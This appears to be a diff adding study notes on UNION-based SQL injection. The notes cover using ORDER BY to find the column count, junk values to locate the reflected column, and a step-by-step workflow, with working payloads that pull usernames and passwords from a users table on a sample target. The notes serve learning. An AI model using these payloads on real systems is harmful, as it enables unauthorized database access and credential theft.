@@ -1,0 +1,173 @@
+🧠 Union SQLi — Core Breakdown
+🔹 What is UNION?
+UNION lets you combine results from two SELECT statements — basically appending rows from another query into the current result set.
+
+sql
+Copy
+Edit
+SELECT * FROM ports
+UNION
+SELECT * FROM ships;
+✅ Same number of columns
+
+✅ Matching data types
+
+💣 When Union Gets Exploit-y
+Let’s say the backend query is:
+
+sql
+Copy
+Edit
+SELECT name, price FROM products WHERE id='user_input'
+If it’s injectable, you can sneak in:
+
+sql
+Copy
+Edit
+' UNION SELECT username, password FROM users-- 
+🧨 Boom — you’re pulling creds into the UI like it’s just part of the original product query.
+
+🔢 What If You Don't Know Column Count?
+Start testing with:
+
+sql
+Copy
+Edit
+' ORDER BY 1-- 
+' ORDER BY 2-- 
+' ORDER BY 3-- 
+...
+Once you get an error like:
+
+sql
+Copy
+Edit
+Unknown column '5' in 'order clause'
+💡 You now know the number of columns is 4.
+
+🧪 Column Discovery Technique (with junk data)
+Try:
+
+sql
+Copy
+Edit
+' UNION SELECT 1,2,3,4-- 
+If it reflects back 2, you now know:
+
+Column count: ✅ 4
+
+Output location: ✅ 2nd column
+
+Later, inject:
+
+sql
+Copy
+Edit
+' UNION SELECT null, username, password, null FROM users-- 
+🧠 Mindset Flowchart for Union SQLi
+Check for SQLi: '
+
+Column Count: ' ORDER BY 1--, ' ORDER BY 2-- etc.
+
+Test Columns: ' UNION SELECT 1,2,3--
+
+Identify Output Column
+
+Extract Data: Replace the number with real column like username
+
+🧠 This Is a Core Step in UNION SQLi:
+✅ Use ' to test for injection
+
+✅ Use ORDER BY to find column count
+
+✅ Use UNION SELECT with that same number of columns
+
+🔍 Inject junk values like 1,2 to test reflection
+
+💥 Swap in username,password or other goodies once confirmed
+
+✅ Recap: What ORDER BY Tests Are For
+You use:
+
+pgsql
+Copy
+Edit
+?id=1' ORDER BY 1-- 
+?id=1' ORDER BY 2-- 
+?id=1' ORDER BY 3-- 
+to figure out how many columns the original query is selecting — so that you can build a valid UNION SELECT payload that won’t throw an error.
+
+🧠 So Where in a Web App Would You Use This?
+✳️ You do NOT need credentials first. You can use this wherever there’s a dynamic parameter hitting the DB.
+Typical examples:
+
+Web App Feature	URL Example	What to Test
+Product pages	/product.php?id=1	Test ?id=1' ORDER BY 1--
+News articles	/news?id=4	Test ?id=4' ORDER BY 1--
+Search forms (POST or GET)	search.php?q=abc	Use ' to trigger errors
+Filtered lists	?category=2	Try SQLi there too
+You’re usually hunting in:
+
+URLs with parameters (GET)
+
+Form submissions (POST)
+
+Cookies (sometimes!)
+
+Headers (advanced, but doable)
+
+📌 So What's the Flow?
+Here's a full example workflow:
+
+🛒 Say the URL is:
+bash
+Copy
+Edit
+http://target.site/products.php?id=1
+Step 1: Test for injection
+Try:
+
+bash
+Copy
+Edit
+?id=1'
+and get a SQL error? That’s 🔥
+
+Step 2: Use ORDER BY to find column count
+pgsql
+Copy
+Edit
+?id=1' ORDER BY 1--     ✅
+?id=1' ORDER BY 2--     ✅
+?id=1' ORDER BY 3--     ❌ <-- error here
+→ Now you know there are 2 columns
+
+Step 3: Test UNION SELECT
+bash
+Copy
+Edit
+?id=1' UNION SELECT 1,2-- 
+→ If 1 or 2 shows on the page, you know which column reflects output.
+
+Step 4: Dump real data
+Now you try:
+
+bash
+Copy
+Edit
+?id=1' UNION SELECT username,password FROM users-- 
+And that’s when you see those juicy admin creds 👀
+
+💡 TL;DR:
+WHERE: Any dynamic parameter (URL, form, etc.)
+
+WHEN: As soon as you see signs of SQL injection (errors, weird behavior)
+
+WHY: To build a working UNION SELECT that matches the backend query shape
+
+🛠️ TL;DR
+1, 2, 3 help you find where output lands.
+
+You replace those with real column names after you enumerate or guess them.
+
+Reflection doesn’t mean “this is password” — it means “this is the slot we can use to print password if we know it.”
